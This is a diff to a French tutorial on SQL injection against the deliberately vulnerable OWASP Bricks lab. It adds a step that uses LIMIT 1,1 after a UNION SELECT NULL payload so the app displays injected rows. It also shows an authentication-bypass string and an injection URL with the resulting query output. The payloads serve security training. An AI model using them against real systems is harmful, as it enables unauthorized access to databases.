@@ -230,7 +230,7 @@ Si on ne connait pas de nom d'utilisateur, on peut utiliser la syntaxe `xxx' OR 
 Injecter sans connaitre un utilisateur : `nimp' OR '1'='1';-- `
 
 
-# Injection avec UNION
+# Injection SQL : récupération de données avec UNION
 
 On va chercher à utiliser l'opérateur UNION pour extraire des données de la base SQL.
 
@@ -295,3 +295,26 @@ L'application n'affiche malgré tout que la première ligne. Nos `NULL` ne sont 
  Néanmoins, l'absence de message d'erreur nous permet de déduire que nous avons bien le bon nombre de colonnes.
 
 ![La réponse ne change pas avec une simple injection UNION SELECT NULL,...](images/select_union.png)
+
+## Utilisation de LIMIT 1,1
+
+L'application n'affichant que la 1ère ligne. On peut utiliser l'opérateur `LIMIT 1,1` après notre `UNION SELECT NULL,NULL,NULL,...` pour que l'application affiche notre requête.
+
+L'URL `http://192.168.56.101/owaspbricks/content-1/index.php?id=1+UNION+SELECT+NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL+LIMIT+1,1;--`
+
+Correspond à la requête:
+```
+SQL Query: SELECT * FROM users WHERE idusers=1 UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL LIMIT 1,1;-- LIMIT 1
+```
+
+```
++---------+------+-------+----------+------+------+------+------+
+| idusers | name | email | password | ua   | ref  | host | lang |
++---------+------+-------+----------+------+------+------+------+
+|    NULL | NULL | NULL  | NULL     | NULL | NULL | NULL | NULL |
++---------+------+-------+----------+------+------+------+------+
+```
+
+L'application n'affiche plus les "User ID: 1" et autres données de la requête initiale (avant le `UNION`).
+
+![L'application affiche nos NULL,NULL,NULL,... c'est à dire rien !](images/select_limit_nulls.png)
